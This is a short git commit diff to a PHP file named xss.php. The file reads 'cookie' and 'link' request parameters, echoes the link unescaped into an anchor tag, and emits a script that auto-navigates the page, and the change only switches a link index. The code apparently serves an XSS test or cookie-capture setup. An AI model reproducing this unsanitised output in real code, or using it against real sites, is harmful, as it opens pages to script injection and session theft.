bcffc0a05286c3aa43b1dca85da618640e5a8e5e
Federico <federicodebona@hotmail.it>
2019-12-13 09:05:32 +0100

    -

--- xss.php
+++ xss.php
@@ -2,5 +2,5 @@
 $cookie = $_REQUEST['cookie'];
 $link = $_REQUEST['link'];
 echo "<a href='$link'>link</a>";
-echo "<script>window.open(document.links[0].baseURI, '_self')</script>";
+echo "<script>window.open(document.links[1].baseURI, '_self')</script>";
 ?>
